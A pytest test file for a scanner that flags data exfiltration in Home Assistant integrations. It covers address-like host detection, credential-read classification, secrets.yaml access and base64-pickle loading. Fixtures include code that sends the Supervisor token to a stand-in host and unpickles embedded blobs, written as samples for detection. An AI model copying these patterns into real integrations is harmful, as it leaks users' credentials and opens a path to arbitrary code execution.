"""(0.15) "Data leaving" from the full Marketplace run: 36 pairings, none theft.

Each case is a shape from a real integration with the names changed; each kept case is
a way the same shape could hide a real send. Outside hosts are .invalid or .example.
Nothing runs: `ast.parse`, Semgrep and text reads only.
"""

from __future__ import annotations

import shutil
import textwrap
from pathlib import Path

import pytest

from sniff_test.analyzers import correlate, semgrep
from sniff_test.analyzers.endpoints import addressed_hosts
from sniff_test.models import Category, Evidence, Fact, Finding, Ring, Severity, Target, TargetKind

needs_semgrep = pytest.mark.skipif(shutil.which("semgrep") is None, reason="needs semgrep")


def _integration(tmp_path: Path, files: dict[str, str]) -> Target:
    root = tmp_path / "custom_components" / "acme_power"
    root.mkdir(parents=True)
    (root / "manifest.json").write_text('{"domain": "acme_power", "name": "Acme"}')
    for rel, text in files.items():
        (root / rel).write_text(textwrap.dedent(text))
    return Target(source=str(root), kind=TargetKind.INTEGRATION, root=root, domain="acme_power")


# --- only hosts used like an address ---------------------------------------------------------

ADDRESSES = """\
    import logging
    _LOGGER = logging.getLogger(__name__)
    HOST = "api.collect.example"
    BASE_URL = "https://cloud.collect.example/v1"
    NAMESPACES = {"tt": "http://www.schema.example/ver10/schema"}
    TAG = "{http://www.wsdl.example/ns}Envelope"
    APPS = {"tv": "com.vendor.android.tv"}
    METRICS = ["container.disk.io", "area.id"]
    HELP = "See https://docs.vendor.example/setup for help"
    LINK = '<a href="https://forum.vendor.example/t">forum</a>'


    def go(session, server):
        _LOGGER.warning("https://status.vendor.example/ is down")
        session.get("https://direct.collect.example/x")
        return session.get(server or "mqtt.collect.example")


    def form(self):
        return self.async_show_form(description_placeholders={"url": "https://docs2.vendor.example/"})
    """


def test_only_strings_used_like_an_address_count(tmp_path):
    target = _integration(tmp_path, {"__init__.py": ADDRESSES})
    assert addressed_hosts(target.root) == {
        "api.collect.example",
        "cloud.collect.example",
        "direct.collect.example",
        "mqtt.collect.example",
    }


def _src(rule: str, ev: str) -> Finding:
    return Finding(rule, "t", Severity.HIGH, Category.SENSITIVE_ACCESS, "m", file="a.py",
                   line=1, evidence=ev)  # fmt: skip


def _facts(*hosts: str) -> list[Fact]:
    return [
        *(Fact(Ring.NETWORK, "host", h, "connects_to", Evidence.POSSIBLE,
               attrs={"class": "undeclared"}) for h in hosts),
        Fact(Ring.NETWORK, "http_client", "aiohttp", "uses", Evidence.POSSIBLE, file="a.py",
             attrs={"outbound": True}),
    ]  # fmt: skip


def test_a_pairing_needs_a_host_used_like_an_address(tmp_path):
    src = [_src("ha-read-secrets", 'open("/config/secrets.yaml")')]
    facts = _facts("container.disk.io", "www.schema.example")
    assert correlate.correlate(src, facts, tmp_path, None, {"api.collect.example"}) == []
    facts = _facts("container.disk.io", "api.collect.example")
    out = correlate.correlate(src, facts, tmp_path, None, {"api.collect.example"})
    assert [f.rule_id for f in out] == ["possible-exfil"]
    assert "api.collect.example" in out[0].message and "container" not in out[0].message
    # without the lens (JavaScript, or nothing read): every named host still counts
    assert correlate.correlate(src, facts, tmp_path, None, None)


# --- what counts as a credential read --------------------------------------------------------


@pytest.mark.parametrize(
    "rule,evidence,credential",
    [
        # login internals that only count, look up, check or remove tokens
        ("ha-auth-internals", "n = sum(1 for t in user.refresh_tokens.values() "
         "if t.token_type == \"long_lived_access_token\")", False),
        ("ha-auth-internals", "hass.auth.async_get_refresh_token(connection.refresh_token_id)",
         False),
        ("ha-auth-internals", "return hass.auth.async_validate_access_token(token)", False),
        ("ha-auth-internals", "hass.auth.async_remove_refresh_token(refresh)", False),
        # a token's value, or a new token
        ("ha-auth-internals", "token = hass.auth.async_create_access_token(refresh)", True),
        ("ha-auth-internals", "rt = await hass.auth.async_create_refresh_token(user)", True),
        ("ha-auth-internals", "send(refresh.token)", True),
        ("ha-auth-internals", "key = refresh.jwt_key", True),
        # another app's entry: a field named by a constant, or behind `or {}`
        ("ha-foreign-entry-data", 'if str(entry.data.get(CONF_ADDRESS, "")) == t:', False),
        ("ha-foreign-entry-data", "if e := entry.data.get(PRICE_SENSOR):", False),
        ("ha-foreign-entry-data", 'host = (entry.data or {}).get("host")', False),
        ("ha-foreign-entry-data", "x = entry.data.get(CONF_PASSWORD)", True),
        ("ha-foreign-entry-data", 'irk = (entry.data or {}).get("irk")', True),
        ("ha-foreign-entry-data", "data = dict(entry.data or {})", True),
        ("ha-foreign-entry-data", "h = entry.data.get(CONF_HOST); send(entry.data)", True),
        ("ha-foreign-entry-data", "x = entry.data.get(KEYS[0])", True),
    ],
)  # fmt: skip
def test_what_counts_as_a_credential_read(rule, evidence, credential):
    assert correlate._credential_read(_src(rule, evidence)) is credential


# --- the Supervisor, a flow's own entries, one secret by name ---------------------------------

PY = {
    "__init__.py": """\
        import os
        import urllib.request


        def announce(body):
            token = os.environ.get("SUPERVISOR_TOKEN")
            request = urllib.request.Request(
                "http://supervisor/discovery",
                data=body,
                headers={"Authorization": f"Bearer {token}"},
            )
            with urllib.request.urlopen(request, timeout=10):
                return True


        def announce_elsewhere(body, where):
            token = os.environ.get("SUPERVISOR_TOKEN")
            request = urllib.request.Request(where, data=body, headers={"Authorization": token})
            with urllib.request.urlopen(request, timeout=10):
                return True


        def announce_twice(body):
            token = os.environ.get("SUPERVISOR_TOKEN")
            request = urllib.request.Request("http://supervisor/x", headers={"A": token})
            request = urllib.request.Request("https://collect.invalid/c", headers={"A": token})
            with urllib.request.urlopen(request, timeout=10):
                return True
        """,
    "secret.py": """\
        KEY_NAME = "acme_power_key"


        def key(hass, yaml_util):
            secrets = yaml_util.load_yaml(hass.config.path("secrets.yaml"))
            if not secrets or not isinstance(secrets, dict):
                return None
            return secrets.get(KEY_NAME)


        def everything(hass, yaml_util):
            secrets = yaml_util.load_yaml(hass.config.path("secrets.yaml"))
            return secrets.get(KEY_NAME), secrets
        """,
}


@needs_semgrep
def test_the_supervisor_through_a_request_object_and_one_named_secret(tmp_path):
    target = _integration(tmp_path, PY)
    work = tmp_path / "work"
    work.mkdir()
    found = semgrep.run(target, work).findings
    taint = sorted({f.line for f in found if f.rule_id == "ha-exfil-taint"
                    and f.file == "__init__.py"})  # fmt: skip
    assert taint and all(n >= 16 for n in taint)  # the first function only asks the Supervisor
    own = [f for f in found if f.rule_id == "ha-read-own-secret"]
    assert [(f.file, f.line, f.severity) for f in own] == [("secret.py", 5, Severity.MEDIUM)]
    assert "'acme_power_key'" in own[0].message
    assert [(f.file, f.line) for f in found if f.rule_id == "ha-read-secrets"] == [
        ("secret.py", 12)
    ]


@needs_semgrep
def test_a_flows_own_handler_is_its_own_domain(tmp_path):
    flow = """\
        class Flow:
            async def step(self, session):
                for entry in self.hass.config_entries.async_entries(self.handler):
                    print(entry.data)
                for entry in self.hass.config_entries.async_entries(self.other):
                    print(entry.data)
        """
    target = _integration(tmp_path, {"config_flow.py": flow})
    work = tmp_path / "work"
    work.mkdir()
    found = semgrep.run(target, work).findings
    assert sorted(f.line for f in found if f.rule_id == "ha-foreign-entry-data") == [6]


# --- (0.15) unpickling data the app stored ---------------------------------------------------

PICKLE = """\
    import base64
    import pickle
    import zlib

    PAYLOAD = "gASVIAAAAAAAAACMCGJ1aWx0aW5zlIwFcHJpbnSUk5SMAmhplIWUUpQu"


    def load_saved(compressed):
        return pickle.loads(zlib.decompress(base64.b64decode(compressed)))


    def from_uid(uid):
        raw = base64.decodebytes(uid[4:].encode())
        return pickle.loads(raw)


    class Session:
        def restore(self):
            self.jar = pickle.loads(base64.b64decode(self.cookie))


    def hidden():
        return pickle.loads(base64.b64decode(PAYLOAD))


    def hidden_default(data=PAYLOAD):
        return pickle.loads(base64.b64decode(data))


    def hidden_in_file(path):
        return pickle.loads(base64.b64decode(open(path).read()))


    class Loader:
        blob = "gASVIAAAAAAAAACMCGJ1aWx0aW5zlIwFcHJpbnSUk5SMAmhplIWUUpQu"

        def run(self):
            return pickle.loads(base64.b64decode(self.blob))
    """


@needs_semgrep
def test_unpickling_stored_data_is_a_habit_hidden_code_stays_a_threat(tmp_path):
    target = _integration(tmp_path, {"store.py": PICKLE})
    work = tmp_path / "work"
    work.mkdir()
    found = semgrep.run(target, work).findings
    habit = sorted(f.line for f in found if f.rule_id == "py-pickle-stored")
    threat = sorted(f.line for f in found if f.rule_id == "py-b64-exec")
    assert habit == [9, 14, 19]
    assert threat == [23, 27, 31, 38]
    assert all(f.severity is Severity.MEDIUM for f in found if f.rule_id == "py-pickle-stored")
